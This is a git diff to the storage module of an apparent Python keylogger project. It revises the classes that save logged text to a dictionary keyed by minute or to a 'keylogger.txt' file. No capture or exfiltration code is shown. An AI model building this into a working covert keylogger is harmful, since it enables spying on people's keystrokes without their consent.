@@ -1,6 +1,6 @@
 from abc import ABC,abstractmethod
 from datetime import datetime
-
+from pathlib import Path
 
 class IWriter(ABC):
     """Abstract class for Interface Writer with write method"""
@@ -22,6 +22,7 @@ class DictWriter(IWriter):
         self.dct = {}
         return current_dict
 
+    @staticmethod
     def __cur_min():
         """return the current minute as a string"""
         return datetime.now().strftime("%d/%m/%Y, %H:%M")
@@ -29,16 +30,19 @@ class DictWriter(IWriter):
     def write(self, data: list) -> None:
         """Write the given list of characters to the dictionary."""
         data_str = "".join(data)
-        if self.__cur_min() not in self.dct:
-            self.dct[self.__cur_min()] = data_str
-        else:
-            self.dct[self.__cur_min()] += data_str
+        # if self.__cur_min() not in self.dct:
+        # print(DictWriter().__cur_min())
+        self.dct[self.__cur_min()] = data_str
+        # else:
+        #     self.dct[self.__cur_min()] += data_str
 
 
 class FileWriter(IWriter):
     """File writer class with write method
     which get data as string and write it to a text file."""
-    def __init__(self, path :str = "C:/Users/User/OneDrive/GitProjects/KeyloggerFile/keylogger.txt"):
+    def __init__(self, path = None):
+        if not path:
+            path = self.file_path = Path(path) if path else Path.cwd() / "keylogger.txt"
         self.file_path = path
 
     def write(self, data: str) -> None:
